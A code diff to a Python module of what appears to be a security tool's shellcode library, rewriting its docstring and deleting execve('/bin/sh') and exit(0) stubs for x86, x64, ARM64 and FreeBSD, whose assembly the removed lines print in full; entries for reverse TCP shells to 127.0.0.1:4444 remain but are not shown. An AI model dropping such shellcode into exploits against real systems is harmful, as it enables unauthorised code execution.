@@ -1,10 +1,10 @@
-"""A small library of reference shellcode and decoder stubs.
+"""A small set of hand-written reference shellcode and decoder stubs.
 
-These are hand-written reference implementations of well-known payloads,
-written so they assemble in-tool and load straight into the editor. They are
-inspired by the payload families in Metasploit, pwntools (shellcraft) and
-shell-storm, not copied verbatim from them. Network payloads default to
-127.0.0.1:4444 and the XOR stubs to key 0xaa; edit the constants as needed.
+These are hand-written reference implementations inspired by the Metasploit
+payload families (not copied verbatim); they assemble in-tool and load as
+editable assembly. Network payloads default to 127.0.0.1:4444 and the XOR
+stubs to key 0xaa; edit the constants as needed. The bulk of the library's
+entries are generated from pwntools (see pwn_catalog.py).
 
 Each entry carries metadata for the library page's search and sort: arch, os,
 category (functionality), kind (payload or decoder) and source.
@@ -12,7 +12,7 @@ category (functionality), kind (payload or decoder) and source.
 
 from .engine import Arch, assemble_lines
 
-# execve("/bin/sh") tails reused by several entries.
+# execve("/bin/sh") tails reused by the reverse-shell entries.
 _X86_EXECVE = """\
   xor eax, eax
   push eax
@@ -40,28 +40,6 @@ _X64_EXECVE = """\
 
 
 LIBRARY = [
-    {
-        "id": "x86-linux-execve",
-        "name": "execve(\"/bin/sh\")",
-        "arch": "x86", "os": "linux",
-        "category": "exec", "kind": "payload", "source": "shell-storm",
-        "description": "Classic Linux x86 execve(\"/bin/sh\") shell spawn.",
-        "address": 0x1000,
-        "asm": _X86_EXECVE,
-    },
-    {
-        "id": "x86-linux-exit",
-        "name": "exit(0)",
-        "arch": "x86", "os": "linux",
-        "category": "exit", "kind": "payload", "source": "shell-storm",
-        "description": "Linux x86 exit(0) via int 0x80.",
-        "address": 0x1000,
-        "asm": """\
-  xor eax, eax
-  xor ebx, ebx
-  mov al, 1             // __NR_exit
-  int 0x80""",
-    },
     {
         "id": "x86-linux-reverse-tcp",
         "name": "reverse TCP shell 127.0.0.1:4444",
@@ -130,28 +108,6 @@ encoded:
   // encoded shellcode goes here""",
     },
     {
-        "id": "x64-linux-execve",
-        "name": "execve(\"/bin/sh\")",
-        "arch": "x64", "os": "linux",
-        "category": "exec", "kind": "payload", "source": "shell-storm",
-        "description": "Linux x64 execve(\"/bin/sh\") shell spawn.",
-        "address": 0x1000,
-        "asm": _X64_EXECVE,
-    },
-    {
-        "id": "x64-linux-exit",
-        "name": "exit(0)",
-        "arch": "x64", "os": "linux",
-        "category": "exit", "kind": "payload", "source": "shell-storm",
-        "description": "Linux x64 exit(0) via syscall.",
-        "address": 0x1000,
-        "asm": """\
-  xor rdi, rdi
-  push 0x3c             // __NR_exit
-  pop rax
-  syscall""",
-    },
-    {
         "id": "x64-linux-reverse-tcp",
         "name": "reverse TCP shell 127.0.0.1:4444",
         "arch": "x64", "os": "linux",
@@ -214,71 +170,6 @@ get_addr:
 encoded:
   // encoded shellcode goes here""",
     },
-    {
-        "id": "arm64-linux-execve",
-        "name": "execve(\"/bin/sh\")",
-        "arch": "arm64", "os": "linux",
-        "category": "exec", "kind": "payload", "source": "shell-storm",
-        "description": "Linux ARM64 execve(\"/bin/sh\"); builds the path with movz/movk.",
-        "address": 0x1000,
-        "asm": """\
-  // "/bin/sh\\0" on the stack
-  movz x0, 0x622f       // "/b"
-  movk x0, 0x6e69, lsl 16   // "in"
-  movk x0, 0x732f, lsl 32   // "/s"
-  movk x0, 0x68, lsl 48     // "h"
-  sub sp, sp, 16
-  str x0, [sp]
-  mov x0, sp            // path
-  mov x1, xzr           // argv = NULL
-  mov x2, xzr           // envp = NULL
-  mov x8, 221           // __NR_execve
-  svc 0""",
-    },
-    {
-        "id": "arm64-linux-exit",
-        "name": "exit(0)",
-        "arch": "arm64", "os": "linux",
-        "category": "exit", "kind": "payload", "source": "shell-storm",
-        "description": "Linux ARM64 exit(0) via svc.",
-        "address": 0x1000,
-        "asm": """\
-  mov x0, xzr
-  mov x8, 93            // __NR_exit
-  svc 0""",
-    },
-    {
-        "id": "x64-freebsd-execve",
-        "name": "execve(\"/bin/sh\")",
-        "arch": "x64", "os": "freebsd",
-        "category": "exec", "kind": "payload", "source": "shell-storm",
-        "description": "FreeBSD x64 execve(\"/bin/sh\") (syscall 59).",
-        "address": 0x1000,
-        "asm": """\
-  xor rdx, rdx
-  mov rbx, 0x68732f2f6e69622f   // "/bin//sh"
-  push rbx
-  mov rdi, rsp
-  push rdx
-  push rdi
-  mov rsi, rsp
-  push 0x3b             // SYS_execve
-  pop rax
-  syscall""",
-    },
-    {
-        "id": "x64-freebsd-exit",
-        "name": "exit(0)",
-        "arch": "x64", "os": "freebsd",
-        "category": "exit", "kind": "payload", "source": "shell-storm",
-        "description": "FreeBSD x64 exit(0) (syscall 1).",
-        "address": 0x1000,
-        "asm": """\
-  xor rdi, rdi
-  push 1                // SYS_exit
-  pop rax
-  syscall""",
-    },
 ]
 
 
@@ -292,7 +183,7 @@ def _size(arch: Arch, asm: str, address: int) -> int | None:
 
 def catalog() -> list[dict]:
     """The full library for the API: hand-written entries (loaded as
-    assembly) plus any pwntools-generated entries (loaded as raw bytes)."""
+    assembly) plus pwntools-generated entries (loaded as raw bytes)."""
     from . import pwn_catalog
 
     out = []
